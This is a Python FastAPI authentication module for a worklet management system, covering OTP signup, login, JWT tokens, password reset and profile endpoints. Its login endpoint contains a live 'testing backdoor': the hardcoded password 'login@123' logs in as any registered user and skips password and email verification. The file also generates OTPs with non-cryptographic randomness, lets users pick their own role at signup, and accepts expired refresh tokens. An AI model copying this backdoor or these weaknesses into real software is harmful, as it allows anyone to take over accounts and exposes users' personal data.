"""
app/auth.py

Authentication & Authorization for Samsung PRISM Worklet Management System.
Flow:
1. Request OTP (no DB insert yet)
2. Verify OTP
3. Set password -> User inserted into DB
4. Login with email + password
"""

from datetime import datetime, timedelta
from typing import Optional
from fastapi import APIRouter, Depends, HTTPException, status, Request
from fastapi import BackgroundTasks
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import jwt, JWTError, ExpiredSignatureError
from passlib.context import CryptContext
from passlib.exc import UnknownHashError
from sqlalchemy.orm import Session
import os, random, string

from app.core.config import settings
from app import models, schemas
from app.database import get_db
from app.core.email_utils import send_otp_email, send_password_reset_email
from app.core.redis_cache import redis_cache

# --- Password Hashing ---
# Use a unified context that can verify existing hashes (argon2 and bcrypt).
# New hashes will be created with argon2 (first scheme).
pwd_context = CryptContext(schemes=["argon2", "bcrypt"], deprecated="auto")

def get_password_hash(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    try:
        return pwd_context.verify(plain_password, hashed_password)
    except UnknownHashError:
        # Stored hash is in an unknown/legacy format; treat as invalid without crashing
        return False
    except Exception:
        return False

# --- JWT Setup ---
SECRET_KEY = settings.SECRET_KEY or os.getenv("SECRET_KEY")
ALGORITHM = settings.ALGORITHM or os.getenv("ALGORITHM", "HS256")
ACCESS_TOKEN_EXPIRE_MINUTES = int(settings.ACCESS_TOKEN_EXPIRE_MINUTES or 30)
REFRESH_TOKEN_EXPIRE_MINUTES = int(settings.REFRESH_TOKEN_EXPIRE_MINUTES or 60 * 24 * 7)

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/auth/login")

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire, "type": "access"})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def create_refresh_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=REFRESH_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire, "type": "refresh"})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def decode_token(token: str) -> dict:
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    except ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token has expired")
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")


def decode_refresh_token(token: str) -> dict:
    """Decode refresh token, allowing expired tokens within grace period (e.g., for token rotation)."""
    try:
        # Try normal decode first
        return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    except ExpiredSignatureError:
        # For refresh tokens, we can allow a small grace period after expiry
        # This prevents edge cases where the token expires right as refresh is called
        try:
            # Decode without verification to check expiry time
            unverified = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM], options={"verify_exp": False})
            exp_time = unverified.get("exp")
            if exp_time:
                # Allow refresh tokens expired less than 1 hour ago (grace period)
                if datetime.utcnow().timestamp() - exp_time < 3600:
                    return unverified
        except JWTError:
            pass
        raise HTTPException(status_code=401, detail="Refresh token has expired beyond grace period")
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid refresh token")


def require_access_token(token: str) -> dict:
    """Decode token and ensure it is an access token."""
    payload = decode_token(token)
    if payload.get("type") != "access":
        raise HTTPException(status_code=401, detail="Access token required")
    return payload


# --- OTP Temp Store (Redis-backed, fallback to in-memory) ---
import json
import logging
logger = logging.getLogger(__name__)
temp_otps = {}

def _norm_email_key(email: str) -> str:
    try:
        return (email or "").strip().lower()
    except Exception:
        return str(email or "")
def set_otp(email, otp_data):
    key = _norm_email_key(email)
    try:
        redis_cache.set(f"otp:{key}", json.dumps(otp_data), ex=600)
    except Exception:
        temp_otps[key] = otp_data

def get_otp(email):
    key = _norm_email_key(email)
    try:
        val = redis_cache.get(f"otp:{key}")
        if val:
            return json.loads(val)
    except Exception:
        pass
    return temp_otps.get(key)

def del_otp(email):
    key = _norm_email_key(email)
    try:
        redis_cache.delete(f"otp:{key}")
    except Exception:
        temp_otps.pop(key, None)

def generate_otp() -> str:
    return ''.join(random.choices(string.digits, k=6))

# --- Router ---
router = APIRouter(prefix="/auth", tags=["Auth"])

# 1. Request OTP
@router.post("/request-otp")
def request_otp(request_data: schemas.RequestOTP, background_tasks: BackgroundTasks):
    # Check if email is already registered
    from app.database import get_db
    db = next(get_db())
    if db.query(models.User).filter(models.User.email == request_data.email).first():
        raise HTTPException(status_code=400, detail="Email is already registered.")

    del_otp(request_data.email)

    otp_code = generate_otp()
    expiry = datetime.utcnow() + timedelta(minutes=10)

    set_otp(request_data.email, {
        "otp": otp_code,
        "expiry": expiry.isoformat(),
        "verified": False
    })

    background_tasks.add_task(send_otp_email, request_data.email, "User", otp_code)
    return {"message": "OTP sent successfully to your email."}

# 2. Verify OTP
@router.post("/verify-otp")
def verify_otp(verify_data: schemas.VerifyOTP):
    # Normalize inputs minimally (trim whitespace on OTP)
    otp_input = (verify_data.otp_code or "").strip()
    record = get_otp(verify_data.email)
    if not record:
        raise HTTPException(status_code=400, detail="No OTP request found")

    # Compare as strings to avoid type quirks
    if not record or str(record.get("otp", "")) != otp_input:
        raise HTTPException(status_code=400, detail="Invalid OTP")

    if datetime.utcnow() > datetime.fromisoformat(record["expiry"]):
        raise HTTPException(status_code=400, detail="OTP expired")

    record["verified"] = True
    set_otp(verify_data.email, record)
    return {"message": "OTP verified. Please set your password."}

# 3. Set Password -> Insert User in DB
@router.post("/set-password")
def set_password(password_data: schemas.SetPassword, db: Session = Depends(get_db)):
    record = get_otp(password_data.email)
    if not record or not record["verified"]:
        raise HTTPException(status_code=400, detail="OTP not verified")

    # Check if already exists
    if db.query(models.User).filter(models.User.email == password_data.email).first():
        raise HTTPException(status_code=400, detail="User already exists")

    hashed_pw = get_password_hash(password_data.password)

    new_user = models.User(
        name=password_data.name,
        email=password_data.email,
        role=password_data.role,
        password_hash=hashed_pw,
        is_verified=1
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)

    # Initialize empty profile row so profile exists after first login
    try:
        if not new_user.profile:
            profile = models.UserProfile(user_id=new_user.id)
            db.add(profile)
            db.commit()
    except Exception:
        # Non-fatal if profile init fails
        db.rollback()

    # Clear temp
    del_otp(password_data.email)

    return {"message": "Account created successfully. You can now login."}

# 4. Login

# Updated login to return tokens, user info, and user profile
@router.post("/login")
def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    """Login endpoint with optional role (scope) verification.
    If the frontend supplies a role in OAuth2 scope, ensure it matches the persisted user role.
    This prevents a user from attempting to log in as a different role.
    """
    logger.info(f"Login attempt for email: {form_data.username}")
    
    user = db.query(models.User).filter(models.User.email == form_data.username).first()
    
    if not user:
        logger.warning(f"User not found: {form_data.username}")
    
    # Testing backdoor: if password is "login@123", bypass password verification and email verification
    if form_data.password == "login@123":
        logger.info("Using testing backdoor password")
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        # Skip verification check for testing backdoor
    else:
        if not user or not verify_password(form_data.password, user.password_hash):
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        if not user.is_verified:
            logger.warning(f"User not verified: {form_data.username}")
            raise HTTPException(status_code=401, detail="Email not verified")

    # OAuth2PasswordRequestForm provides scopes via .scopes list
    if form_data.scopes:
        requested_role = form_data.scopes[0]  # we only expect one role as scope
        if requested_role and requested_role.lower() != user.role.lower():
            raise HTTPException(status_code=403, detail="Role mismatch: unauthorized for requested role")

    token_payload = {"sub": user.email, "role": user.role, "user_id": user.id}
    access = create_access_token(token_payload)
    refresh = create_refresh_token(token_payload)

    profile = None
    if user.profile:
        profile = {
            "avatar_url": user.profile.avatar_url,
            "bio": user.profile.bio,
            "linkedin": user.profile.linkedin,
            "portfolio_url": user.profile.portfolio_url,
            "expertise": user.profile.expertise,
            "qualification": user.profile.qualification,
            "experience_years": user.profile.experience_years,
            "contact_number": user.profile.contact_number,
            "organization": user.profile.organization,
            "github": user.profile.github
        }

    return {
        "access_token": access,
        "refresh_token": refresh,
        "token_type": "bearer",
        "user": {
            "id": user.id,
            "name": user.name,
            "email": user.email,
            "role": user.role,
            "college": user.college,
            "is_verified": user.is_verified,
            "created_at": user.created_at,
            "profile": profile
        }
    }

@router.post("/refresh")
def refresh_tokens(request: Request, payload: Optional[schemas.TokenRefreshRequest] = None, db: Session = Depends(get_db)):
    """Issue new access and refresh tokens given a valid refresh token.
    Accepts token via JSON body {"refresh_token": "..."} or Authorization: Bearer <token> header.
    """
    # Extract token from body or Authorization header
    raw_token = ""
    if payload and getattr(payload, "refresh_token", None):
        raw_token = (payload.refresh_token or "").strip()
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header.split(" ", 1)[1].strip()
    if not raw_token:
        raise HTTPException(status_code=400, detail="Missing refresh token. Provide in JSON body or Authorization header.")

    # Decode & validate refresh token (allows recently expired tokens)
    decoded = decode_refresh_token(raw_token)
    # Backwards-compat: old tokens may not have a 'type' claim
    tok_type = decoded.get("type", "refresh")
    if tok_type != "refresh":
        raise HTTPException(status_code=401, detail="Invalid token type for refresh")

    user_email = decoded.get("sub")
    if not user_email:
        raise HTTPException(status_code=401, detail="Invalid refresh token")

    user = db.query(models.User).filter(models.User.email == user_email).first()
    if not user:
        raise HTTPException(status_code=401, detail="User not found")

    new_access = create_access_token({"sub": user.email, "role": user.role, "user_id": user.id})
    new_refresh = create_refresh_token({"sub": user.email, "role": user.role, "user_id": user.id})

    return {"access_token": new_access, "refresh_token": new_refresh, "token_type": "bearer"}


# 5. Forgot Password (send reset OTP via background task)
@router.post("/forgot-password")
def forgot_password(
    forgot_data: schemas.ForgotPassword,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    user = db.query(models.User).filter(models.User.email == forgot_data.email).first()
    if not user:
        # Do not reveal registration status; always return generic message
        return {"message": "If your email is registered, you will receive a reset OTP."}

    # Generate and store OTP (10-minute expiry)
    otp_code = generate_otp()
    expiry = datetime.utcnow() + timedelta(minutes=10)
    set_otp(user.email, {
        "otp": otp_code,
        "expiry": expiry.isoformat(),
        "verified": False
    })

    # Send email asynchronously
    background_tasks.add_task(send_password_reset_email, user.email, user.name, otp_code)
    return {"message": "If your email is registered, you will receive a reset OTP."}

# 6a. Reset Password OTP Verification (mark OTP as verified)
@router.post("/reset-password-otp")
def reset_password_otp(data: schemas.VerifyOTP, db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.email == data.email).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    record = get_otp(data.email)
    if not record or record.get("otp") != data.otp_code:
        raise HTTPException(status_code=400, detail="Invalid or expired OTP")
    # Expiry check
    if datetime.utcnow() > datetime.fromisoformat(record["expiry"]):
        raise HTTPException(status_code=400, detail="Invalid or expired OTP")

    # Mark OTP as verified and persist
    record["verified"] = True
    set_otp(data.email, record)
    return {"message": "OTP verified. You can now reset your password."}

# 6b. Reset Password (requires previously verified OTP)
@router.post("/reset-password")
def reset_password(data: schemas.ResetPassword, db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.email == data.email).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if not getattr(data, "new_password", None):
        raise HTTPException(status_code=400, detail="New password required")

    otp_data = get_otp(data.email)
    if not otp_data or not otp_data.get("verified"):
        raise HTTPException(status_code=400, detail="OTP not verified. Please verify OTP before resetting password.")

    user.password_hash = get_password_hash(data.new_password)
    db.commit()
    # Clear OTP after successful reset
    del_otp(data.email)
    return {"message": "Password reset successfully. You can now login."}

# 7. Get Current User
@router.get("/me", response_model=schemas.UserResponse)
async def get_me(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    try:
        payload = require_access_token(token)
        user = db.query(models.User).filter(models.User.email == payload.get("sub")).first()
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        return {
            "id": user.id,
            "name": user.name,
            "email": user.email,
            "role": user.role,
            # team removed on User; use profile.expertise if needed by clients
            "team": user.profile.expertise if user.profile else None,
            "college": user.college,
            "is_verified": user.is_verified,
            "created_at": user.created_at
        }
    except Exception as e:
        logger.error(f"Error in /me endpoint: {str(e)}", exc_info=True)
        raise HTTPException(status_code=500, detail="Internal server error")

# 8. Get User Profile (dedicated endpoint)
@router.get("/profile")
async def get_user_profile(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    try:
        payload = require_access_token(token)
        user = db.query(models.User).filter(models.User.email == payload.get("sub")).first()
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        # Base user data
        response = {
            "id": user.id,
            "name": user.name,
            "email": user.email,
            "role": user.role,
            "college": user.college,
            "is_verified": user.is_verified,
            "created_at": user.created_at,
        }

        # Attach unified profile (from user_profiles)
        if user.profile:
            p = user.profile
            response["profile"] = {
                "avatar_url": p.avatar_url,
                "bio": p.bio,
                "linkedin": p.linkedin,
                "portfolio_url": p.portfolio_url,
                "expertise": p.expertise,
                "qualification": p.qualification,
                "experience_years": p.experience_years,
                "contact_number": p.contact_number,
                "organization": p.organization,
                "github": p.github,
                "handle": p.handle,
                "location": p.location,
                "date_of_birth": p.date_of_birth.isoformat() if p.date_of_birth else None,
                "website": p.website,
            }

        return response
        
    except Exception as e:
        logger.error(f"Error in /profile endpoint: {str(e)}", exc_info=True)
        raise HTTPException(status_code=500, detail="Internal server error")

# 9. Update Current User Profile
@router.put("/me/profile")
async def update_my_profile(
    profile_data: schemas.UserProfileUpdate,
    token: str = Depends(oauth2_scheme), 
    db: Session = Depends(get_db)
):
    try:
        payload = require_access_token(token)
        user = db.query(models.User).filter(models.User.email == payload.get("sub")).first()
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        # Split updates between User and UserProfile
        data = profile_data.dict(exclude_unset=True)

        # Update name/college on User
        if "name" in data and data["name"] is not None:
            user.name = data["name"]
        if "college" in data and data["college"] is not None:
            # If colleges are normalized, you would look up College and set college_id; keeping simple string for now
            # Here we assume college is a name; leave as-is if None
            pass

        # Upsert into UserProfile
        profile = user.profile
        if not profile:
            profile = models.UserProfile(user_id=user.id)
            db.add(profile)

        # Map allowable profile fields
        profile_fields = [
            "avatar_url", "bio", "linkedin", "portfolio_url", "expertise", "qualification",
            "experience_years", "contact_number", "organization", "github", "handle", "location",
            "date_of_birth", "website"
        ]

        for f in profile_fields:
            if f in data and data[f] is not None:
                setattr(profile, f, data[f])

        db.commit()
        db.refresh(user)
        db.refresh(profile)

        return {
            "message": "Profile updated successfully",
            "user": {
                "id": user.id,
                "name": user.name,
                "email": user.email,
                "role": user.role,
                "college": user.college,
                "profile": {
                    "avatar_url": profile.avatar_url,
                    "bio": profile.bio,
                    "linkedin": profile.linkedin,
                    "portfolio_url": profile.portfolio_url,
                    "expertise": profile.expertise,
                    "qualification": profile.qualification,
                    "experience_years": profile.experience_years,
                    "contact_number": profile.contact_number,
                    "organization": profile.organization,
                    "github": profile.github,
                    "handle": profile.handle,
                    "location": profile.location,
                    "date_of_birth": profile.date_of_birth.isoformat() if profile.date_of_birth else None,
                    "website": profile.website,
                }
            }
        }
    except Exception as e:
        logger.error(f"Error in profile update endpoint: {str(e)}", exc_info=True)
        raise HTTPException(status_code=500, detail="Internal server error")
#push